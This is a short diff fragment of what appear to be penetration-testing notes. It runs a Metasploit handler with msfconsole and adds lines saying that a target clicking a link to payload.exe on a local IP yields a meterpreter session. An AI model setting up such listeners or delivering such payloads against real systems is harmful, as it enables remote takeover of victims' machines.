@@ -57,5 +57,7 @@ gedit handler_tcp.rc&
 (add "run")
 
 └─# msfconsole -r handler_tcp.rc
+listens
 
+target clicks on http://192.168.0.27/payload.exe > meterpreter
 
